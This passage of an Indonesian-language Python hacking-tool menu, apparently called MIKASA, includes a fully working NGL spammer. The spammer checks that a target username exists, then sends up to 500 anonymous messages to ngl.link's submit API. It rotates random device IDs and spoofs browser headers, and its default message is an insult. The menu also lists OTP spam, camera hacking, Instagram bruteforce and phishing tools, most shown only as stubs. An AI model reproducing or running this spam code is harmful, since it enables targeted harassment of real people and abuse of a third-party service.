        else:
            print(f"\n{K}[!] Pilihan tidak valid!{RESET}")
            time.sleep(1)

def tool_ip_tracker():
    os.system('clear')
    print(f"{Y}[!] IP Tracker - Dalam pengembangan{N}")
    input("Tekan ENTER...")

def tool_port_scanner():
    os.system('clear')
    print(f"{Y}[!] Port Scanner - Dalam pengembangan{N}")
    input("Tekan ENTER...")

def tool_bot_telegram():
    os.system('clear')
    print(f"{Y}[!] Telegram Spammer - Dalam pengembangan{N}")
    input("Tekan ENTER...")

def tool_ig_brute():
    os.system('clear')
    print(f"{Y}[!] IG Bruteforce - Dalam pengembangan{N}")
    input("Tekan ENTER...")

def tool_spam_NGL():
    os.system('clear')
    
    # Warna lokal (orange, putih, kuning)
    ORANGE = '\033[38;5;208m'
    YELLOW = '\033[1;33m'
    WHITE = '\033[1;37m'
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    RESET = '\033[0m'
    
    def banner_ngl():
        os.system('clear')
        print(f"""{ORANGE}
    ███████╗██████╗  █████╗ ███╗   ███╗
    ██╔════╝██╔══██╗██╔══██╗████╗ ████║
    ███████╗██████╔╝███████║██╔████╔██║
    ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
    ███████║██║     ██║  ██║██║ ╚═╝ ██║
    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝
    
            {YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{ORANGE}
            {WHITE}Author : {YELLOW}Rulzz06
            {WHITE}Tools  : {YELLOW}NGL SPAMMER
            {WHITE}Status : {YELLOW}READY
            {YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{ORANGE}
            {WHITE}Ketik {YELLOW}exit {WHITE}untuk kembali ke MIKASA
            {WHITE}Tekan {YELLOW}CTRL+C {WHITE}untuk stop spam
            {YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
        """)
    
    def garis_ngl():
        print(f"{ORANGE}—————————————————————————————————————————————————{RESET}")
    
    def cek_username_ngl(username):
        try:
            url = f"https://ngl.link/{username}"
            resp = requests.get(url, timeout=5, allow_redirects=True)
            if resp.status_code == 200:
                if "not found" in resp.text.lower() or "404" in resp.text:
                    return False, "Username tidak ditemukan"
                return True, "Username valid"
            elif resp.status_code == 404:
                return False, "Username tidak ditemukan (404)"
            else:
                return False, f"Error: status {resp.status_code}"
        except Exception as e:
            return False, f"Error: {str(e)[:30]}"
    
    def kirim_pesan_ngl(username, pesan):
        """Kirim 1 pesan ke NGL - FIX DETEKSI SUCCESS"""
        url = "https://ngl.link/api/submit"
        
        payload = {
            "username": username,
            "question": pesan,
            "deviceId": str(uuid.uuid4())
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Origin": "https://ngl.link",
            "Referer": f"https://ngl.link/{username}",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin"
        }
        
        try:
            resp = requests.post(url, json=payload, headers=headers, timeout=10)
            
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    # KALAU ADA questionId BERARTI SUKSES!
                    if data.get("questionId"):
                        return True, "Berhasil"
                    elif data.get("success") or data.get("status") == "success":
                        return True, "Berhasil"
                    else:
                        return False, f"Response: {data}"
                except:
                    return True, "Berhasil (status 200)"
            else:
                return False, f"HTTP {resp.status_code}"
                
        except requests.exceptions.Timeout:
            return False, "Timeout"
        except requests.exceptions.ConnectionError:
            return False, "Connection Error"
        except Exception as e:
            return False, str(e)[:30]
    
    def spam_ngl_eksekusi(username, pesan, jumlah):
        print(f"\n{WHITE}[*] Target    : {YELLOW}{username}{RESET}")
        print(f"{WHITE}[*] Pesan     : {YELLOW}{pesan}{RESET}")
        print(f"{WHITE}[*] Jumlah    : {YELLOW}{jumlah}{RESET}")
        print(f"{WHITE}[*] Status    : {YELLOW}Mengirim spam...{RESET}")
        garis_ngl()
        
        berhasil = 0
        gagal = 0
        
        try:
            for i in range(jumlah):
                status, info = kirim_pesan_ngl(username, pesan)
                
                if status:
                    print(f"{WHITE}[{GREEN}+{WHITE}] Pesan ke-{i+1} : {GREEN}BERHASIL{RESET}")
                    berhasil += 1
                else:
                    print(f"{WHITE}[{RED}!{WHITE}] Pesan ke-{i+1} : {RED}GAGAL ({info}){RESET}")
                    gagal += 1
                
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            print(f"\n\n{YELLOW}[!] Spam dihentikan oleh user!{RESET}")
        
        garis_ngl()
        print(f"{WHITE}[+] Berhasil : {GREEN}{berhasil}{RESET}")
        print(f"{WHITE}[+] Gagal    : {RED}{gagal}{RESET}")
        print(f"{WHITE}[+] Total    : {YELLOW}{berhasil + gagal}{RESET}")
        garis_ngl()
    
    # ===== MAIN LOOP NGL =====
    while True:
        banner_ngl()
        
        print(f"\n{WHITE}⟬{ORANGE}𝗠𝗮𝘀𝘂𝗸𝗸𝗮𝗻 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 𝗡𝗚𝗟 𝗧𝗮𝗿𝗴𝗲𝘁{WHITE} ⟭{YELLOW}➤➤{RESET} ", end="")
        username = input().strip()
        
        if username.lower() == 'exit':
            print(f"\n{YELLOW}[!] Kembali ke MIKASA...{RESET}")
            time.sleep(1)
            break
        
        if not username:
            print(f"\n{WHITE}[{RED}!{WHITE}] Username tidak boleh kosong!{RESET}")
            time.sleep(1)
            continue
        
        print(f"\n{WHITE}[*] Mengecek username {YELLOW}{username}{WHITE}...{RESET}")
        valid, msg = cek_username_ngl(username)
        
        if not valid:
            print(f"{WHITE}[{RED}!{WHITE}] {RED}{msg}{RESET}")
            print(f"{WHITE}[{YELLOW}!{WHITE}] Coba username lain{RESET}")
            time.sleep(2)
            continue
        
        print(f"{WHITE}[{GREEN}+{WHITE}] {GREEN}{msg}{RESET}")
        
        # ===== PESAN CUSTOM =====
        pesan_default = "Your A IDiot HaAhAh"
        print(f"\n{WHITE}⟬{ORANGE}𝗣𝗲𝘀𝗮𝗻 𝗬𝗮𝗻𝗴 𝗗𝗶𝗸𝗶𝗿𝗶𝗺{WHITE} ⟭{YELLOW}➤➤{RESET}")
        print(f"{WHITE}  [{YELLOW}1{WHITE}] Pakai pesan default: {YELLOW}{pesan_default}{RESET}")
        print(f"{WHITE}  [{YELLOW}2{WHITE}] Masukkan pesan sendiri{RESET}")
        print(f"{WHITE}⟬{ORANGE}Pilih{WHITE} ⟭{YELLOW}➤➤{RESET} ", end="")
        pilihan_pesan = input().strip()
        
        if pilihan_pesan == '2':
            print(f"{WHITE}⟬{ORANGE}𝗞𝗲𝘁𝗶𝗸 𝗽𝗲𝘀𝗮𝗻{WHITE} ⟭{YELLOW}➤➤{RESET} ", end="")
            pesan = input().strip()
            if not pesan:
                pesan = pesan_default
                print(f"{WHITE}[{YELLOW}!{WHITE}] Pesan kosong, pakai default{RESET}")
        else:
            pesan = pesan_default
            print(f"{WHITE}[{GREEN}+{WHITE}] Pakai pesan default{RESET}")
        
        # ===== JUMLAH SPAM DENGAN LIMIT 500 =====
        print(f"\n{WHITE}⟬{ORANGE}𝗝𝘂𝗺𝗹𝗮𝗵 𝗦𝗽𝗮𝗺{WHITE} ⟭{YELLOW}➤➤{RESET} {WHITE}(min 1, max 500 per kirim){RESET}")
        print(f"{WHITE}⟬{ORANGE}Jumlah{WHITE} ⟭{YELLOW}➤➤{RESET} ", end="")
        try:
            jumlah = int(input().strip())
            
            if jumlah > 500:
                print(f"\n{WHITE}[{YELLOW}+{WHITE}] {YELLOW}Angka terlalu banyak! Mohon mengikuti limit!{RESET}")
                print(f"{WHITE}[{YELLOW}!{WHITE}] Maksimal {YELLOW}500{WHITE} pesan per kirim{RESET}")
                time.sleep(2)
                continue
            
            if jumlah <= 0:
                print(f"{WHITE}[{RED}!{WHITE}] Jumlah harus lebih dari 0!{RESET}")
                time.sleep(1)
                continue
                
        except ValueError:
            print(f"{WHITE}[{RED}!{WHITE}] Masukkan angka yang valid!{RESET}")
            time.sleep(1)
            continue
        
        # ===== EKSEKUSI SPAM =====
        spam_ngl_eksekusi(username, pesan, jumlah)
        
        print(f"\n{WHITE}[{ORANGE}+{WHITE}] Selesai! {YELLOW}Tekan Enter untuk lanjut, atau ketik 'exit' untuk kembali{RESET}")
        cmd = input().strip()
        if cmd.lower() == 'exit':
            print(f"\n{YELLOW}[!] Kembali ke MIKASA...{RESET}")
            time.sleep(1)
            break

def tool_Phissing():
    os.system('clear')
    print(f"{Y}[!] Web Scraper - Dalam pengembangan{N}")
    input("Tekan ENTER...")

def tool_proxy_checker():
    os.system('clear')
    print(f"{Y}[!] Proxy Checker - Dalam pengembangan{N}")
    input("Tekan ENTER...")

def tool_file_organizer():
    os.system('clear')
    print(f"{Y}[!] File Organizer - Dalam pengembangan{N}")
    input("Tekan ENTER...")

# ===================== MENU =====================
def menu_utama():
    global clock_running, current_input
    
    clock_running = True
    clock_thread = threading.Thread(target=refresh_date, daemon=True)
    clock_thread.start()
    
    tools = {
        "1": tool_otp_spam, "01": tool_otp_spam,
        "2": tool_Hack_camera, "02": tool_Hack_camera,
        "3": tool_osint, "03": tool_osint,
        "4": tool_email_spam, "04": tool_email_spam,
        "5": tool_decoder, "05": tool_decoder,
        "6": tool_encryptor, "06": tool_encryptor,
        "7": tool_imei_checker, "07": tool_imei_checker,
        "8": tool_ip_tracker, "08": tool_ip_tracker,
        "9": tool_port_scanner, "09": tool_port_scanner,
        "10": tool_bot_telegram,
        "11": tool_ig_brute,
        "12": tool_spam_NGL,
        "13": tool_Phissing,
        "14": tool_proxy_checker,
        "15": tool_file_organizer,
    }
    
    try:
        while True:
            current_input = ""
            pilihan = input().strip()
            current_input = pilihan
            
            if pilihan in ["0", "00"]:
                clock_running = False
                print(f"\n{R}[!] Keluar dari MIKASA...{N}")
                time.sleep(1)
                os.system('clear')
                sys.exit(0)
            elif pilihan in tools:
                clock_running = False
                tools[pilihan]()
                clock_running = True
                if not clock_thread.is_alive():
                    clock_thread = threading.Thread(target=refresh_date, daemon=True)
                    clock_thread.start()
            else:
                print(f"\n{R}[!] Pilihan tidak valid!{N}")
                time.sleep(1)
    except KeyboardInterrupt:
        clock_running = False
        print(f"\n\n{R}[!] Keluar...{N}")
        sys.exit(0)

if __name__ == "__main__":
    check_update()
    uid = get_uid()
    status, user = cek_uid(uid)
    if status is None:
        print(f"{R}[!] Gagal terhubung ke server lisensi.{N}")
        time.sleep(3)
        sys.exit(1)
    elif status is False:
        menu_uid()
    elif user.get("status") != "active":
        print(f"{Y}[!] Akun kamu belum diaktivasi admin.{N}")
        time.sleep(3)
        sys.exit(0)
    try:
        menu_utama()
    except KeyboardInterrupt:
        print(f"\n\n{R}[!] Keluar...{N}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{R}[!] Error: {e}{N}")
        time.sleep(2)
        sys.exit(1)
